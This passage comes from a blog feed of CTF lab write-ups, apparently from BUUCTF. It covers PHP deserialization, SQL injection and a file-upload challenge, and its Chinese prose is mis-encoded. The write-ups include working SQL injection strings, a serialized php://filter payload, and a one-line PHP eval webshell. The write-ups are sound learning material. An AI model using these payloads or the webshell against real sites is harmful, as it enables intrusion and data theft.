href="#ä¸‰-è§£é¢˜æ€è·¯" class="headerlink" title="ä¸‰.è§£é¢˜æ€è·¯"></a>ä¸‰.è§£é¢˜æ€è·¯</h4><p>ç°åœ¨æˆ‘ä»¬çš„ç›®æ ‡å¾ˆæ˜ç¡®äº†ï¼Œå°±æ˜¯è¦æƒ³åŠæ³•è°ƒç”¨åˆ°read()å‡½æ•°ã€‚é‚£ä¹ˆæˆ‘ä»¬è¦é¿å…<code>op</code>åœ¨<code>__destruct()</code>å‡½æ•°ä¸­è¢«èµ‹å€¼ä¸º1ã€‚</p><p>ç”±äºå¼±ç­‰äºåªåˆ¤æ–­å€¼æ˜¯å¦ç›¸ç­‰ï¼Œè€Œå¼ºç­‰äºä¸ä»…åˆ¤æ–­å€¼æ˜¯å¦ç›¸ç­‰ï¼Œè¿˜å…ˆåˆ¤æ–­ç±»å‹æ˜¯å¦ç›¸ç­‰ã€‚æˆ‘ä»¬æ³¨æ„åˆ°è¿™é‡Œ<code>__destruct()</code>å‡½æ•°ä¸­æ˜¯<code>op</code>å¼ºç­‰äº<strong>å­—ç¬¦ä¸²</strong>2ï¼Œé‚£æˆ‘ä»¬åªè¦è®©opç­‰äº<strong>æ•°å­—</strong>2å°±å¯ä»¥ç»•è¿‡å¼ºç­‰äºçš„é™åˆ¶äº†ã€‚</p><p>æœ€åæˆ‘ä»¬å†ç”¨<code>php://filter</code>æ–‡ä»¶è¯»å–æµé…åˆ<code>file_get_contents()</code>å‡½æ•°å°±å¯ä»¥è·å–åˆ°flagå•¦ã€‚</p><h4 id="å››-æ„é€ åºåˆ—åŒ–payload"><a href="#å››-æ„é€ åºåˆ—åŒ–payload" class="headerlink" title="å››.æ„é€ åºåˆ—åŒ–payload"></a>å››.æ„é€ åºåˆ—åŒ–payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    public $op &#x3D; 2;</span><br><span class="line">    public  $filename &#x3D; &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;</span><br><span class="line">    public  $content;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new FileHandler();</span><br><span class="line">$b &#x3D; serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ä»£ç æ‰§è¡Œè¾“å‡ºb=<code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></p><p>payload:<code>http://cb84aa4b-0ded-48ad-b2e7-b1cc59cdfdb3.node4.buuoj.cn/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></p><p><img src="/2021/07/19/buuctf9/image-20210719214207190.png" alt="image-20210719214207190"></p><p>base64è§£ç å¾—flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢&quot;&gt;&lt;a href=&quot;#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢&quot; class=&quot;headerlink&quot; title=&quot;[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢&quot;&gt;&lt;/a&gt;[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢&lt;/h1&gt;&lt;p&gt;æ‰“å¼€å®¹å™¨ï¼Œæ˜¯ä¸€é“æ–‡ä»¶ä¸Šä¼ </summary>
      
    
    
    
    
    <category term="åˆ·é¢˜" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>buuctf8</title>
    <link href="http://example.com/2021/07/17/buuctf8/"/>
    <id>http://example.com/2021/07/17/buuctf8/</id>
    <published>2021-07-17T06:11:11.000Z</published>
    <updated>2021-07-19T04:34:01.863Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h1><p>æ‰“å¼€å®¹å™¨</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ç½‘é¼æ¯-2018-Fakebook&quot;&gt;&lt;a href=&quot;#ç½‘é¼æ¯-2018-Fakebook&quot; class=&quot;headerlink&quot; title=&quot;[ç½‘é¼æ¯ 2018]Fakebook&quot;&gt;&lt;/a&gt;[ç½‘é¼æ¯ 2018]Fakebook&lt;/h1&gt;&lt;p&gt;æ‰“å¼€å®¹å™¨&lt;/p&gt;</summary>
      
    
    
    
    
    <category term="åˆ·é¢˜" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>buuctf7</title>
    <link href="http://example.com/2021/07/15/buuctf7/"/>
    <id>http://example.com/2021/07/15/buuctf7/</id>
    <published>2021-07-15T10:19:24.000Z</published>
    <updated>2021-07-18T12:49:52.082Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h1><p>æ‰“å¼€å®¹å™¨ï¼Œå‘ç°è¿™æ˜¯ä¸€é“sqlæ³¨å…¥é¢˜è€Œä¸”æ˜¯ä¹‹å‰çš„ä¸€é“ç»­é¢˜</p><h4 id="ä¸€-å‘ç°æ³¨å…¥ç‚¹ï¼š"><a href="#ä¸€-å‘ç°æ³¨å…¥ç‚¹ï¼š" class="headerlink" title="ä¸€.å‘ç°æ³¨å…¥ç‚¹ï¼š"></a>ä¸€.å‘ç°æ³¨å…¥ç‚¹ï¼š</h4><p>ç»è¿‡æµ‹è¯•å‘ç°å®ƒå­˜åœ¨æ³¨å…¥ç‚¹ï¼š<code>&#39;</code>ï¼Œè€Œä¸”æ³¨å…¥çš„ä½ç½®æ˜¯åœ¨å¯†ç æ <img src="/buuctf7.assets/image-20210718112626887.png" alt="image-20210718112626887"></p><p><img src="/buuctf7.assets/image-20210718112747724.png" alt="image-20210718112747724"></p><h4 id="äºŒ-æ¢ç´¢æ³¨å…¥æ–¹å¼ï¼š"><a href="#äºŒ-æ¢ç´¢æ³¨å…¥æ–¹å¼ï¼š" class="headerlink" title="äºŒ.æ¢ç´¢æ³¨å…¥æ–¹å¼ï¼š"></a>äºŒ.æ¢ç´¢æ³¨å…¥æ–¹å¼ï¼š</h4><p>è¿›è¿‡åˆæ­¥çš„æµ‹è¯•æˆ‘å‘ç°è¿‡æ»¤äº†å¾ˆå¤šå…³é”®è¯ï¼ŒåŒ…æ‹¬ï¼šç©ºæ ¼ï¼Œunionï¼Œand(&amp;)ï¼Œor(|)ç­‰ç­‰</p><p>ä½†æ˜¯æˆ‘è¿™é‡Œå‘ç°å®ƒæ²¡æœ‰è¿‡æ»¤**å¼‚æˆ–ç¬¦(^)**ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¼‚æˆ–ç¬¦åšè¿æ¥ç¬¦ï¼Œç„¶åæˆ‘ä»¬è¿™è¾¹å¯ä»¥ç”¨æ‹¬å·ä»£æ›¿ç©ºæ ¼ï¼ˆæ³¨æ„è¿™é‡Œçš„æ›¿ä»£ä¸æ˜¯å®Œå…¨æ›¿ä»£çš„æ„æ€ï¼Œæˆ‘æ˜¯æ€ä¹ˆç†è§£çš„ï¼šç”¨æ‹¬å·æŠŠåè¯ç»„æ‹¬èµ·æ¥ä»¥ä»£æ›¿ç©ºæ ¼ï¼Œå› æ­¤è¿™é¢˜å †å æ³¨å…¥è‚¯å®šç”¨ä¸äº†äº†ï¼Œå› ä¸ºshowå’Œdatabasesä¹‹é—´è¦ç”¨ç©ºæ ¼éš”å¼€ã€‚ï¼‰æ‰€ä»¥æ€æ¥æƒ³å»å¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥ï¼Œè¿™æ ·ä¹Ÿæ— éœ€è€ƒè™‘å¼‚æˆ–åˆ¤æ–­è¯­å¥æˆç«‹çš„æ¡ä»¶ã€‚</p><h4 id="ä¸‰-æŠ¥é”™æ³¨å…¥å¼€å§‹ï¼š"><a href="#ä¸‰-æŠ¥é”™æ³¨å…¥å¼€å§‹ï¼š" class="headerlink" title="ä¸‰.æŠ¥é”™æ³¨å…¥å¼€å§‹ï¼š"></a>ä¸‰.æŠ¥é”™æ³¨å…¥å¼€å§‹ï¼š</h4><h5 id="1-çˆ†åº“"><a href="#1-çˆ†åº“" class="headerlink" title="1.çˆ†åº“"></a>1.çˆ†åº“</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;^extractvalue(1,concat(0x7e,database()))#</span><br></pre></td></tr></table></figure><p><img src="/buuctf7.assets/image-20210718125452943.png" alt="image-20210718125452943"></p><h5 id="2-çˆ†è¡¨"><a href="#2-çˆ†è¡¨" class="headerlink" title="2.çˆ†è¡¨"></a>2.çˆ†è¡¨</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(&#39;geek&#39;)))))#</span><br></pre></td></tr></table></figure><p><img src="/buuctf7.assets/image-20210718125505104.png" alt="image-20210718125505104"></p><h5 id="3-çˆ†åˆ—"><a href="#3-çˆ†åˆ—" class="headerlink" title="3.çˆ†åˆ—"></a>3.çˆ†åˆ—</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;)))))#</span><br></pre></td></tr></table></figure><p><img src="/buuctf7.assets/image-20210718125606817.png" alt="image-20210718125606817"></p><h5 id="4-çˆ†å€¼"><a href="#4-çˆ†å€¼" class="headerlink" title="4.çˆ†å€¼"></a>4.çˆ†å€¼</h5><p>è¿™è¾¹ç”±äºæŠ¥é”™é•¿åº¦å—é™ï¼Œæˆ‘ä»¬å¯ä»¥çŒœæµ‹ä¸€ä¸‹flagåº”è¯¥æ˜¯åœ¨passwordé‡Œï¼ŒèŠ‚çœä¸€ä¸‹å›æ˜¾é•¿åº¦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;^extractvalue(1,concat(0x7e,(select(password)from(geek.H4rDsq1))))#</span><br></pre></td></tr></table></figure><p><img src="/buuctf7.assets/image-20210718130428916.png" alt="image-20210718130428916"></p><p>å¯ä»¥çœ‹åˆ°è¿˜å·®ä¸€ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥è¯•è¯•ç”¨left()å’Œright()å»æˆª</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;^extractvalue(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1))))#</span><br></pre></td></tr></table></figure><p><img src="/buuctf7.assets/image-20210718130606174.png" alt="image-20210718130606174"></p><p>æœ€åæŠŠflagæ‹¼æ¥ä¸€ä¸‹å¾—ï¼šflag{0b94076f-db77-46e6-9ea3-34468bd544a0}</p><h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><h4 id="åŸé¢˜ç›®æè¿°ï¼šåˆšå­¦å®Œsqliï¼Œæˆ‘æ‰çŸ¥é“ä¸‡èƒ½å£ä»¤è¿™ä¹ˆå±é™©ï¼Œè¿˜å¥½æˆ‘è¿›è¡Œäº†é˜²æŠ¤ï¼Œè¿˜ç”¨md5å“ˆå¸Œäº†å¯†ç ï¼"><a href="#åŸé¢˜ç›®æè¿°ï¼šåˆšå­¦å®Œsqliï¼Œæˆ‘æ‰çŸ¥é“ä¸‡èƒ½å£ä»¤è¿™ä¹ˆå±é™©ï¼Œè¿˜å¥½æˆ‘è¿›è¡Œäº†é˜²æŠ¤ï¼Œè¿˜ç”¨md5å“ˆå¸Œäº†å¯†ç ï¼" class="headerlink" title="åŸé¢˜ç›®æè¿°ï¼šåˆšå­¦å®Œsqliï¼Œæˆ‘æ‰çŸ¥é“ä¸‡èƒ½å£ä»¤è¿™ä¹ˆå±é™©ï¼Œè¿˜å¥½æˆ‘è¿›è¡Œäº†é˜²æŠ¤ï¼Œè¿˜ç”¨md5å“ˆå¸Œäº†å¯†ç ï¼"></a>åŸé¢˜ç›®æè¿°ï¼šåˆšå­¦å®Œsqliï¼Œæˆ‘æ‰çŸ¥é“ä¸‡èƒ½å£ä»¤è¿™ä¹ˆå±é™©ï¼Œè¿˜å¥½æˆ‘è¿›è¡Œäº†é˜²æŠ¤ï¼Œè¿˜ç”¨md5å“ˆå¸Œäº†å¯†ç ï¼</h4><p>æ‰“å¼€å®¹å™¨ï¼Œå‘ç°æ˜¯ä¸€é“sqlæ³¨å…¥é¢˜ï¼ŒæŒ‰ç…§æƒ¯ä¾‹å…ˆçœ‹æºç </p><h4 id="ä¸€-å‘ç°hintæ–‡ä»¶"><a href="#ä¸€-å‘ç°hintæ–‡ä»¶" class="headerlink" title="ä¸€.å‘ç°hintæ–‡ä»¶"></a>ä¸€.å‘ç°hintæ–‡ä»¶</h4><p>å‘ç°æœ‰ä¸€ä¸ªsearch.phpçš„æ–‡ä»¶ï¼š</p><p><img src="/buuctf7.assets/image-20210718173529948.png" alt="image-20210718173529948"></p><p>åˆšå¼€å§‹æˆ‘è¿˜ä»¥ä¸ºè¿™æ˜¯base64ï¼Œç»“æœè§£ç å®Œæ˜¯ä¹±ç ï¼Œæœç´¢å‘ç°åŸæ¥æ˜¯base32ã€‚</p><p><strong>æ³¨æ„base32 å’Œ base64 çš„åŒºåˆ«ï¼š</strong><br>base32 åªæœ‰å¤§å†™å­—æ¯å’Œæ•°å­—ç»„æˆï¼Œæˆ–è€…åé¢æœ‰ä¸‰ä¸ªç­‰å·ã€‚<br>base64 åªæœ‰å¤§ã€å°å†™å­—æ¯å’Œæ•°å­—ç»„æˆï¼Œåé¢ä¸€èˆ¬æ˜¯ä¸¤ä¸ªç­‰å·ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬æŠŠè¿™æ®µè¯è§£ç ï¼š<img src="/buuctf7.assets/image-20210718173904505.png" alt="image-20210718173904505"></p><p>å¾—åˆ°ä¸€ä¸²base64ç¼–ç ä¸²ï¼Œå†è§£ç ï¼š<img src="/buuctf7.assets/image-20210718173944250.png" alt="image-20210718173944250"></p><p>å‘ç°å°±æ˜¯ä¸€å¥æ™®é€šçš„sqlè¯­å¥ï¼Œæ³¨å…¥ç‚¹ä¸º<code>&#39;</code></p><h4 id="äºŒ-å°è¯•æ³¨å…¥"><a href="#äºŒ-å°è¯•æ³¨å…¥" class="headerlink" title="äºŒ.å°è¯•æ³¨å…¥"></a>äºŒ.å°è¯•æ³¨å…¥</h4><p>å…ˆè¯•è¯•æœ€å¸¸ç”¨çš„unionè”åˆæ³¨å…¥</p><p><code>username=0&#39; union select 1,2#</code></p><p><code>password=12</code></p><p><img src="/buuctf7.assets/image-20210718180607767.png" alt="image-20210718180607767"></p><p>å­—æ®µæ•°ä¸ä¸€è‡´ï¼Œusernameæ”¹æˆ<code>0&#39; union select 1,2,3#</code></p><p><img src="/buuctf7.assets/image-20210718180710189.png" alt="image-20210718180710189"></p><p>é‚£ä¹ˆè¯´æ˜userè¡¨å­˜åœ¨ä¸‰ä¸ªåˆ—ï¼ŒæŒ‰ç…§ä¹‹å‰çš„ç»éªŒå°±æ˜¯ï¼šidï¼Œusernameï¼Œpassword</p><p>ç„¶åæˆ‘æƒ³ç›´æ¥çˆ†åº“ï¼š<code>0&#39; union select 1,2,databases#</code>ä½†æ˜¯è¿™æ ·ä¼šæŠ¥é”™ï¼Œæˆ‘æ”¹æˆ<code>0&#39; union select 1,2,database()#</code>å‘ç°å®ƒè¿‡æ»¤äº†æ‹¬å·ï¼Œç„¶åæˆ‘å°è¯•äº†æŠ¥é”™æ³¨å…¥ï¼Œå †å æ³¨å…¥éƒ½ä¸è¡Œï¼Œç„¶åæˆ‘å°±æœ‰ç‚¹æ‡µäº†ï¼Œçœ‹äº†wpæ‰å‘ç°è‡ªå·±å¿˜è®°äº†unionè”åˆæ³¨å…¥çš„ä¸€ä¸ªç‰¹æ€§ï¼š<strong>åœ¨è”åˆæŸ¥è¯¢å¹¶ä¸å­˜åœ¨çš„æ•°æ®æ—¶ï¼Œè”åˆæŸ¥è¯¢å°±ä¼šæ„é€ ä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®ä½œä¸ºå•ç‹¬ä¸€è¡Œæ•°æ®å€¼</strong></p><h5 id="ä¸¾ä¾‹è¯´æ˜ï¼š"><a href="#ä¸¾ä¾‹è¯´æ˜ï¼š" class="headerlink" title="ä¸¾ä¾‹è¯´æ˜ï¼š"></a>ä¸¾ä¾‹è¯´æ˜ï¼š</h5><p>å‡è®¾åŸæœ¬userè¡¨ä¸­åªå­˜åœ¨ä¸€è¡Œæ•°æ®</p><p><img src="/buuctf7.assets/image-20210718183332270.png" alt="image-20210718183332270"></p><p>æˆ‘ä»¬è¾“å…¥æŸ¥è¯¢è¯­å¥ï¼š<code>0&#39; union select 1,&#39;admin&#39;,md5(123)#</code> åå¯ä»¥çœ‹åˆ°userè¡¨ä¸­å¤šäº†ä¸€è¡Œ</p><p><img src="/buuctf7.assets/image-20210718183759389.png" alt="image-20210718183759389"></p><p>è¿™æ ·ä¸€æ¥æˆ‘ä»¬å°±æ··æ·†äº†adminè´¦å·çš„å¯†ç ã€‚</p><p>è¿™é‡Œè¿˜æœ‰ä¸€ç‚¹è¦æ³¨æ„çš„æ•°æ®åº“ä¼šå…ˆæ£€æµ‹æˆ‘ä»¬çš„usernameæ˜¯å¦å­˜åœ¨ï¼Œç„¶ååˆ¤æ–­ä½ è¾“å…¥çš„å¯†ç çš„md5ç¼–ç å’Œå¯¹åº”ç”¨æˆ·åçš„passwordæ˜¯å¦ä¸€æ ·ã€‚</p><p>å› æ­¤æˆ‘ä»¬è¦æ‰¾ä¸€ä¸ªå­˜åœ¨çš„ç”¨æˆ·åã€‚</p><p>ä¸€èˆ¬æ¥è¯´æ•°æ®åº“ä¸­éƒ½ä¼šæœ‰adminè¿™ä¸ªè´¦å·ï¼Œé‚£æˆ‘ä»¬å°±æ¥æµ‹è¯•ä¸€ä¸‹æ˜¯å¦å­˜åœ¨ï¼š<code>0&#39; union select &#39;admin&#39;,2,3#</code></p><p><img src="/buuctf7.assets/image-20210718202910736.png" alt="image-20210718202910736"></p><p>è¯´æ˜è¦ä¹ˆä¸åœ¨è¿™ä¸€åˆ—ï¼Œè¦ä¹ˆä¸å­˜åœ¨ï¼Œæ¢ä¸€åˆ—è¯•è¯•ï¼š<code>0&#39; union select 1,&#39;admin&#39;,3#</code></p><p><img src="/buuctf7.assets/image-20210718203220570.png" alt="image-20210718203220570"></p><p>å¯ä»¥çœ‹åˆ°è´¦å·adminæ˜¯å­˜åœ¨çš„ã€‚é‚£ä¹ˆä¸‹é¢æˆ‘ä»¬å°±å¯ä»¥æ­£å¼å¼€å§‹æˆ‘ä»¬çš„è”åˆæ³¨å…¥äº†</p><h4 id="ä¸‰-å¼€å§‹æ³¨å…¥ï¼š"><a href="#ä¸‰-å¼€å§‹æ³¨å…¥ï¼š" class="headerlink" title="ä¸‰.å¼€å§‹æ³¨å…¥ï¼š"></a>ä¸‰.å¼€å§‹æ³¨å…¥ï¼š</h4><p>æ„é€ payload:</p><p>username=0â€™ union select 1,â€™adminâ€™,â€™202cb962ac59075b964b07152d234b70â€™#</p><p>password=123</p><p>æ³¨ï¼š<code>202cb962ac59075b964b07152d234b70</code>æ˜¯123çš„MD5ç¼–ç </p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™ä¸¤é“éƒ½æ˜¯SQLæ³¨å…¥çš„é¢˜ï¼Œåšä¸‹æ¥æ„Ÿè§‰å°±æ˜¯è¿™ç§é¢˜æ‰¾å¯¹æ³¨å…¥çš„å§¿åŠ¿å¾ˆé‡è¦</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL&quot;&gt;&lt;a href=&quot;#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL&quot; class=&quot;headerlink&quot; title=&quot;[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL&quot;&gt;&lt;/a&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL&lt;/h1&gt;&lt;p&gt;æ‰“å¼€å®¹å™¨</summary>
      
    
    
    
    
    <category term="åˆ·é¢˜" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>buuctf6</title>
    <link href="http://example.com/2021/07/14/buuctf6/"/>
    <id>http://example.com/2021/07/14/buuctf6/</id>
    <published>2021-07-14T09:38:53.000Z</published>
    <updated>2021-07-17T12:20:04.319Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>æ‰“å¼€å®¹å™¨ï¼Œå‘ç°æ˜¯ä¸€é“æ–‡ä»¶ä¸Šä¼ çš„é¢˜ï¼Œé‚£ä¹ˆæ ¹æ®æˆ‘ä»¬çš„é‡‘å…¸é…æ–¹ï¼Œç¬¬ä¸€æ­¥å°±æ˜¯ä¸Šä¼ åç¼€ä¸ºgifçš„æœ¨é©¬webshell.gifï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åæŠ“åŒ…æ”¹ä¸ºphpï¼Œ</p><p><img src="/2021/07/14/buuctf6/image-20210717104127644.png" alt="image-20210717104127644">æ— æ•ˆåç¼€ï¼Œè¯´æ˜æœåŠ¡å™¨ç«¯ä¹Ÿæ£€æµ‹äº†æ–‡ä»¶åç¼€ï¼Œç„¶åæˆ‘æ¥ç€è¯•äº†phtmlï¼Œphp3ç­‰å˜å½¢åç¼€éƒ½ä¸èƒ½ç»•è¿‡ï¼Œè€Œä¸”ä»–è¿™é‡Œéƒ½ä¸èƒ½ä¸Šä¼ çš„åŸå› éƒ½æ˜¯åç¼€ä¸åˆæ³•ï¼Œæˆ‘å°±æœ‰ç‚¹éš¾å—äº†ï¼Œçœ‹äº†wpå‘ç°ä¹‹å‰upload-labåˆ·çš„å…³äº<code>.user.ini</code>çš„å†…å®¹éƒ½å¿˜å…‰äº†ã€‚</p><h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h2><p><code>php.ini</code>æ˜¯phpé»˜è®¤çš„é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…æ‹¬äº†å¾ˆå¤šphpçš„é…ç½®ï¼Œè¿™äº›é…ç½®ä¸­ï¼Œåˆåˆ†ä¸ºå‡ ç§ï¼š<code>PHP_INI_SYSTEM</code>ã€<code>PHP_INI_PERDIR</code>ã€<code>PHP_INI_ALL</code>ã€<code>PHP_INI_USER</code>ã€‚</p><p><img src="/2021/07/14/buuctf6/image-20210717105827172.png" alt="image-20210717105827172"></p><p>å®é™…ä¸Šï¼Œé™¤äº†<code>PHP_INI_SYSTEM</code>å’Œ<code>PHP_INI_ALL</code>ä»¥å¤–çš„æ¨¡å¼éƒ½æ˜¯å¯ä»¥é€šè¿‡.user.iniæ¥è®¾ç½®çš„ã€‚</p><h5 id="ä¸‹é¢è¿™æ®µè¯æ˜¯å…³äºPHPè¯†åˆ«iniæ–‡ä»¶çš„è§„åˆ™ï¼š"><a href="#ä¸‹é¢è¿™æ®µè¯æ˜¯å…³äºPHPè¯†åˆ«iniæ–‡ä»¶çš„è§„åˆ™ï¼š" class="headerlink" title="ä¸‹é¢è¿™æ®µè¯æ˜¯å…³äºPHPè¯†åˆ«iniæ–‡ä»¶çš„è§„åˆ™ï¼š"></a>ä¸‹é¢è¿™æ®µè¯æ˜¯å…³äºPHPè¯†åˆ«iniæ–‡ä»¶çš„è§„åˆ™ï¼š</h5><p>PHP é™¤äº†æ‰«æä¸» <code>php.ini</code> ä¹‹å¤–ï¼Œè¿˜ä¼šåœ¨æ¯ä¸ªç›®å½•ä¸‹æ‰«æ ini æ–‡ä»¶ï¼Œä»è¢«æ‰§è¡Œçš„ php æ–‡ä»¶æ‰€åœ¨ç›®å½•å¼€å§‹ä¸€ç›´ä¸Šå‡åˆ° web æ ¹ç›®å½•ï¼ˆ<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> æ‰€æŒ‡å®šçš„ï¼‰ã€‚å¦‚æœè¢«æ‰§è¡Œçš„ php æ–‡ä»¶åœ¨ web æ ¹ç›®å½•ä¹‹å¤–ï¼Œåˆ™åªæ‰«æè¯¥ç›®å½•ã€‚</p><h6 id="æˆ‘ä»¬è¿™æ ·ç†è§£è¿™æ®µè¯ï¼šå½“è¢«æ‰§è¡Œçš„-php-æ–‡ä»¶åœ¨-web-æ ¹ç›®å½•ä¹‹å¤–æ—¶ï¼ŒPHPå…ˆåªä¼šæ‰«æ-è¢«æ‰§è¡Œphpæ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨iniæ–‡ä»¶ï¼Œå¦‚æœå­˜åœ¨çš„è¯-å°±ä¼šæŒ‰ç…§è¿™ä¸ªuser-iniå¯¹è¿™ä¸ªç›®å½•è¿›è¡Œé…ç½®ï¼›ç„¶åPHPå‘ä¸Šä¸€çº§ç›®å½•æ‰«æé‡å¤ä¸Šè¿°æ“ä½œç›´è‡³æ‰«æåˆ°æ ¹ç›®å½•ã€‚"><a href="#æˆ‘ä»¬è¿™æ ·ç†è§£è¿™æ®µè¯ï¼šå½“è¢«æ‰§è¡Œçš„-php-æ–‡ä»¶åœ¨-web-æ ¹ç›®å½•ä¹‹å¤–æ—¶ï¼ŒPHPå…ˆåªä¼šæ‰«æ-è¢«æ‰§è¡Œphpæ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨iniæ–‡ä»¶ï¼Œå¦‚æœå­˜åœ¨çš„è¯-å°±ä¼šæŒ‰ç…§è¿™ä¸ªuser-iniå¯¹è¿™ä¸ªç›®å½•è¿›è¡Œé…ç½®ï¼›ç„¶åPHPå‘ä¸Šä¸€çº§ç›®å½•æ‰«æé‡å¤ä¸Šè¿°æ“ä½œç›´è‡³æ‰«æåˆ°æ ¹ç›®å½•ã€‚" class="headerlink" title="æˆ‘ä»¬è¿™æ ·ç†è§£è¿™æ®µè¯ï¼šå½“è¢«æ‰§è¡Œçš„ php æ–‡ä»¶åœ¨ web æ ¹ç›®å½•ä¹‹å¤–æ—¶ï¼ŒPHPå…ˆåªä¼šæ‰«æ è¢«æ‰§è¡Œphpæ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨iniæ–‡ä»¶ï¼Œå¦‚æœå­˜åœ¨çš„è¯ å°±ä¼šæŒ‰ç…§è¿™ä¸ªuser.iniå¯¹è¿™ä¸ªç›®å½•è¿›è¡Œé…ç½®ï¼›ç„¶åPHPå‘ä¸Šä¸€çº§ç›®å½•æ‰«æé‡å¤ä¸Šè¿°æ“ä½œç›´è‡³æ‰«æåˆ°æ ¹ç›®å½•ã€‚"></a>æˆ‘ä»¬è¿™æ ·ç†è§£è¿™æ®µè¯ï¼šå½“è¢«æ‰§è¡Œçš„ php æ–‡ä»¶åœ¨ web æ ¹ç›®å½•ä¹‹å¤–æ—¶ï¼ŒPHPå…ˆåªä¼šæ‰«æ è¢«æ‰§è¡Œphpæ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨iniæ–‡ä»¶ï¼Œå¦‚æœå­˜åœ¨çš„è¯ å°±ä¼šæŒ‰ç…§è¿™ä¸ªuser.iniå¯¹è¿™ä¸ªç›®å½•è¿›è¡Œé…ç½®ï¼›ç„¶åPHPå‘ä¸Šä¸€çº§ç›®å½•æ‰«æé‡å¤ä¸Šè¿°æ“ä½œç›´è‡³æ‰«æåˆ°æ ¹ç›®å½•ã€‚</h6><h5 id="é…ç½®æ–‡ä»¶çš„åˆ©ç”¨ï¼š"><a href="#é…ç½®æ–‡ä»¶çš„åˆ©ç”¨ï¼š" class="headerlink" 